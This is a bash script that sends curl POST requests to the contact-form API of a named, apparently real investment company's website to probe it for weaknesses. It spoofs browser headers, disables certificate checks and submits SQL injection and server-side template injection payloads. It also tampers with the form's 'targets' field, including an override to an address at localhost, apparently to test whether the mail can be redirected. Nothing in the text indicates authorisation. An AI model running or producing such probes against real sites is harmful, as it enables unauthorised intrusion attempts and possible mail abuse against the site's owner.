#!/bin/bash
H='https://www.infinitycapital.bh'
UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome Safari/537.36'
post(){ desc="$1"; shift; printf "=== %s\n" "$desc"; curl -sk -X POST "$H/api/send" -A "$UA" -H "Referer: $H/contact" "$@" -w "\n<<code=%{http_code} ct=%{content_type} t=%{time_total}s>>\n" | head -c 500; echo; }
post "baseline multipart" -F "fname=Probe" -F "lname=User" -F "areacode=973" -F "tel=5551234" -F "cname=probe" -F "subject=hello" -F "msg=hello world" -F "check=1" -F "targets=invest"
post "json body" -H "Content-Type: application/json" -d '{"fname":"Probe"}'
post "empty" -H "Content-Type: application/x-www-form-urlencoded" -d ''
post "sql in cname" -F "fname=Probe" -F "cname=x' AND SLEEP(0)-- -" -F "subject=s" -F "msg=m" -F "check=1" -F "targets=t"
post "ssti in cname" -F "fname={{7*7}}" -F "cname=\${7*7}" -F "subject=<%= 7*7 %>" -F "msg=m" -F "check=1" -F "targets=t"
post "targets array" -F "fname=Probe" -F "targets=a" -F "targets=b" -F "check=1"
post "targets override" -F "fname=Probe" -F "check=1" -F "targets=override@localhost"
post "check=0 (honeypot)" -F "fname=Probe" -F "check=0" -F "targets=t"
